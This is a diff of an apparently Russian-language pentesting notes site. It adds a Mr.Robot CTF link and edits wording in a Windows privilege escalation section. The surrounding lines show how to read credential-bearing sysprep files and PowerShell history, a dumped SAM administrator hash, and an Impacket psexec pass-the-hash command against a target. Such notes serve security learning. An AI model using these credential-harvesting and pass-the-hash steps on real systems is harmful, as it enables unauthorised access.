@@ -1736,6 +1736,8 @@
         
           
         
+          
+        
       
       
         
@@ -1794,6 +1796,20 @@
     <li class="md-nav__item">
       <a href="../../../CTF/Lazy_admin/" class="md-nav__link">
         Lazy Admin
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CTF/MrRobot/" class="md-nav__link">
+        Mr.Robot CTF
       </a>
     </li>
   
@@ -3235,7 +3251,7 @@
 <hr />
 <h2 id="windows">Эскалация привилегий в Windows</h2>
 <h3 id="_2">Сбор сведений среди хранимой информации</h3>
-<p>В процессе работы, сведения включая логины/пароли и прочие полезные данные могут сохранятся в конфигурационных файлах, реестре, файлах с историей ввода команд.</p>
+<p>В процессе работы, сведения, включая логины/пароли и прочие полезные данные, могут сохранятся в конфигурационных файлах, реестре, файлах с историей ввода команд.</p>
 <h4 id="windows_1">Конфигурация автоматической установки Windows</h4>
 <p>В процессе массового развертывания образа ОС на различных машинах через Windows Deployment Server, могут быть найдены конфигурационные файлы содержащие в себе логины/пароли учетных записей с административными правами:</p>
 <ul>
@@ -3246,7 +3262,7 @@
 <li><code>C:\Windows\system32\sysprep\sysprep.xml</code></li>
 </ul>
 <h4 id="powershell">История Powershell</h4>
-<p>Не менее полезным является изучение ввода Powershell:</p>
+<p>Не менее полезным является изучение истории ввода Powershell:</p>
 <div class="language-text highlight"><span class="filename">CMD</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 </span></code></pre></div>
 <div class="language-text highlight"><span class="filename">Powershell</span><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
@@ -3469,7 +3485,7 @@ Everyone:(I)(M) - modify, значит с ним можно делать всё 
 </span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span><span class="nb">local</span><span class="w"> </span>SAM<span class="w"> </span>hashes<span class="w"> </span><span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
 </span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>Administrator:500:bbe4c546c62515ffbbe4c546c62515ff:24b15dedg4e8fd52375f679238d6db85:::
 </span></code></pre></div>
-<p>Используя pass-the-hash атаку получим доступ к системе с привилегиями NT AUTHORITY\SYSTEM. Снова воспользуемся инструментами из <a href="https://github.com/fortra/impacket/tree/master">Impacet</a>:</p>
+<p>Используя <a href="https://en.hackndo.com/pass-the-hash/">pass-the-hash атаку</a> получим доступ к системе с привилегиями <code>NT AUTHORITY\SYSTEM</code>. Снова воспользуемся инструментами из <a href="https://github.com/fortra/impacket/tree/master">Impacet</a>:</p>
 <div class="language-Bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># С машины атакующего</span>
 </span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>python3.9<span class="w"> </span>/opt/impacket/examples/psexec.py<span class="w"> </span>-hashes<span class="w"> </span>bbe4c546c62515ffbbe4c546c62515ff:24b15dedg4e8fd52375f679238d6db85<span class="w"> </span>administrator@TARGET_IP
 </span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>Impacket<span class="w"> </span>v0.9.24.dev1+20210704.162046.29ad5792<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
